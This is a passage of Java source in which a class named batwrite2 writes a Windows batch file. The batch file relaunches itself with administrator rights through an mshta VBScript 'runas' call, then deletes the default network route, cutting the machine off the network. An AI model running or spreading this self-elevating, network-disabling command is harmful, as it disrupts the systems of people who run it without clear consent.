...
public class batwrite2
{		 
	 public static void main(String[]args) throws IOException
     {
        batwrite2.creatTxtFile(); 
        batwrite2.writeTxtFile("%1 mshta vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"cmd.exe\",\"/c %~s0 ::\",\"\",\"runas\",1)(window.close)&&exit"+"\r\nroute delete 0.0.0.0"); 
